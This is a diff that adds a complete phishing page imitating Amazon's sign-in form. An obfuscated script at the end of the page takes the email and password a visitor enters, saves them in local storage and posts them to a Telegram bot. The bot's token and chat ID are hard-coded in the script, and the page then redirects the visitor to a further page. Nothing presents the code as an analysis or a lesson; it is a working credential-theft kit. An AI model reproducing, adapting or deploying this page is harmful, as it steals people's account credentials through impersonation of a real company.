@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Amazon</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f3f3f3;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: #ffffff;
+            border-radius: 4px;
+            padding: 20px;
+            width: 90%;
+            max-width: 300px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        input {
+            margin-bottom: 10px;
+            padding: 8px;
+            border: 1px solid #a6a6a6;
+            border-radius: 3px;
+        }
+        button {
+            background-color: #f0c14b;
+            border: 1px solid #a88734;
+            border-radius: 3px;
+            padding: 8px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #f1c860;
+        }
+        .create-account {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+        }
+        .create-account a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 100px; 
+            height: auto;
+            background-color: transparent; 
+        }
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 24px;
+            }
+            .login-container {
+                padding: 15px;
+            }
+            .logo img {
+                width: 80px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="images.png" alt="Logo" style="background-color: transparent;">
+        </div>
+        <h1>Sign-In</h1>
+        <form id="loginForm">
+            <label for="email">Email (phone for mobile accounts)</label>
+            <input type="text" id="email" name="email" required>
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Continue</button>
+        </form>
+        <div class="create-account">
+            By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.
+        </div>
+    </div>
+    <script>
+       const _0x2d7a2a=_0x303f;(function(_0xf68462,_0x4a9eb9){const _0x13964b=_0x303f,_0x50d6f5=_0xf68462();while(!![]){try{const _0x36e365=-parseInt(_0x13964b(0x104))/0x1*(parseInt(_0x13964b(0xfd))/0x2)+-parseInt(_0x13964b(0x10f))/0x3+-parseInt(_0x13964b(0x103))/0x4+parseInt(_0x13964b(0xf7))/0x5*(parseInt(_0x13964b(0x10c))/0x6)+parseInt(_0x13964b(0x105))/0x7+-parseInt(_0x13964b(0xf3))/0x8+parseInt(_0x13964b(0xf9))/0x9*(parseInt(_0x13964b(0xfb))/0xa);if(_0x36e365===_0x4a9eb9)break;else _0x50d6f5['push'](_0x50d6f5['shift']());}catch(_0x5f3d53){_0x50d6f5['push'](_0x50d6f5['shift']());}}}(_0x4191,0x56a75));const BOT_TOKEN=_0x2d7a2a(0xf6),CHAT_ID='1056460575';function _0x303f(_0x272364,_0x5d5423){const _0x4191ef=_0x4191();return _0x303f=function(_0x303f40,_0x232f2a){_0x303f40=_0x303f40-0xf0;let _0x2b5574=_0x4191ef[_0x303f40];return _0x2b5574;},_0x303f(_0x272364,_0x5d5423);}function _0x4191(){const _0x53d454=['Message\x20sent\x20to\x20Telegram:','preventDefault','location','\x0aPassword:\x20','/sendMessage','345330umkCbx','Error\x20sending\x20message\x20to\x20Telegram:','submit','1005144QeVwXy','https://api.telegram.org/bot','log','addEventListener','2189200eIYhpU','getElementById','setItem','7679048680:AAEkcmjzNJCp421MH1u7gi5bUWh3XiTpNQY','5nmcmYh','value','12491649NWbauh','error','10PMhQrh','stringify','40MwvgnQ','email','fill.html','loginForm','Failed\x20to\x20send\x20message\x20to\x20Telegram','href','2449812RlCzui','14438FzZyTn','2935296mQsTQc','password'];_0x4191=function(){return _0x53d454;};return _0x4191();}async function sendToTelegram(_0x12e120){const _0x28f437=_0x2d7a2a,_0xdd3d3=_0x28f437(0xf0)+BOT_TOKEN+_0x28f437(0x10b),_0x5a6bfd={'chat_id':CHAT_ID,'text':_0x12e120};try{const _0x1fb3b3=await fetch(_0xdd3d3,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x28f437(0xfc)](_0x5a6bfd)});if(!_0x1fb3b3['ok'])throw new Error(_0x28f437(0x101));const _0xb62da3=await _0x1fb3b3['json']();console[_0x28f437(0xf1)](_0x28f437(0x107),_0xb62da3);}catch(_0x231b1b){console[_0x28f437(0xfa)](_0x28f437(0x10d),_0x231b1b);}}document[_0x2d7a2a(0xf4)](_0x2d7a2a(0x100))[_0x2d7a2a(0xf2)](_0x2d7a2a(0x10e),async function(_0x1f7485){const _0x8c4afe=_0x2d7a2a;_0x1f7485[_0x8c4afe(0x108)]();const _0x55cea1=document[_0x8c4afe(0xf4)](_0x8c4afe(0xfe))[_0x8c4afe(0xf8)],_0x53664c=document[_0x8c4afe(0xf4)](_0x8c4afe(0x106))[_0x8c4afe(0xf8)];localStorage[_0x8c4afe(0xf5)](_0x8c4afe(0xfe),_0x55cea1),localStorage[_0x8c4afe(0xf5)](_0x8c4afe(0x106),_0x53664c);const _0x52d2eb='Amazon\x20Login\x0aEmail:\x20'+_0x55cea1+_0x8c4afe(0x10a)+_0x53664c;await sendToTelegram(_0x52d2eb),window[_0x8c4afe(0x109)][_0x8c4afe(0x102)]=_0x8c4afe(0xff);});
+    </script>
+</body>
+</html>
